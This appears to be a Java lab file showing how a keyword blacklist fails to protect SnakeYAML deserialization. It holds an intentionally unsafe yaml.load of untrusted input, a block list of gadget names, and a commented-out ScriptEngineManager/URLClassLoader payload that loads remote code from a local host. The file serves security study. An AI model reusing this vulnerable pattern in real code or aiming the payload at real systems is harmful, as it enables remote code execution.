package com.SugarP1g.deserialization.Yaml.ScriptEngineManager;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.representer.Representer;

public class BlackListBypass {
    private final static String[] YAML_BLOCK_LIST = {"!!", "ScriptEngineManager", "URLClassLoader"};

    private static void checkYaml(String yamlStr) throws Exception {
        for (String blockStr : YAML_BLOCK_LIST) {
            if (yamlStr.contains(blockStr)) {
                throw new Exception("Blacklist is matched.");
            }
        }
    }

    public static <T> T readYaml(String content, Class<T> type) throws Exception {
        Representer representer = new Representer();
        representer.getPropertyUtils().setSkipMissingProperties(true);
        Yaml yaml = new Yaml(representer);
        checkYaml(content);
        return type == null ? yaml.load(content) : yaml.loadAs(content, type);
    }

    public static void main(String[] args) throws Exception {
//        String yamlStr = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
//                + "[[!!java.net.URL [\"http://127.0.0.1:8000/\"]]]]";
        String yamlStr = args[1];
        readYaml(yamlStr, null);
    }
}
